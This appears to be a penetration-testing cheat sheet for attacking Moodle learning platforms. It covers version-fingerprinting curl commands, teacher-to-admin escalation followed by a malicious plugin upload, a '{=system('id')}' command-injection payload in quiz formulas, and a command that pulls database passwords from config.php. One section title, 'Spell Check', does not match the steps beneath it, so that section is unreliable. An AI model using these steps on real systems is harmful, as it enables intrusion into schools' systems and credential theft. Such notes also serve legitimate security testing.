# Moodle

**What it is:** Open-source learning management system (LMS) used by universities and schools. Found on educational targets. Admin accounts can execute PHP code through plugins and themes.

**Default ports:** 80, 443

**Vuln research:**
- [Moodle Security Announcements](https://moodle.org/security/)
- [SearchSploit: `searchsploit moodle`](https://www.exploit-db.com/search?q=moodle)
- [CVE Details — Moodle](https://www.cvedetails.com/product/4080/Moodle-Moodle.html)

---

### Identify Moodle version

Check specific paths and source code

```bash
curl -s http://$IP/ | grep "moodle"
curl -s http://$IP/lib/upgrade.txt | head -5
curl -s http://$IP/theme/upgrade.txt | head -5
# Admin login: /login/index.php
```

---

### Moodle RCE via Spell Check (CVE-2020-14321)

Teacher role escalation to admin → RCE — Moodle < 3.9

```bash
# Requires teacher account
# Enrol yourself as manager in a course → gain admin
# Then: Site Administration → Plugins → Install plugins → Upload malicious plugin ZIP
```

---

### Moodle RCE via calculated questions

If you have teacher or admin access — PHP code execution

```bash
# Quiz → Add Question → Calculated
# In answer formula: {=system('id')}
# Or use the Tex filter if enabled for command execution
```

---

### Moodle config.php

Database credentials in plaintext

```bash
cat /var/www/html/moodle/config.php | grep -E "(dbhost|dbname|dbuser|dbpass)"
```

<details>
<summary>Example Output</summary>

```
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle_admin';
$CFG->dbpass    = 'M00dle_Pass!';
```
</details>

---
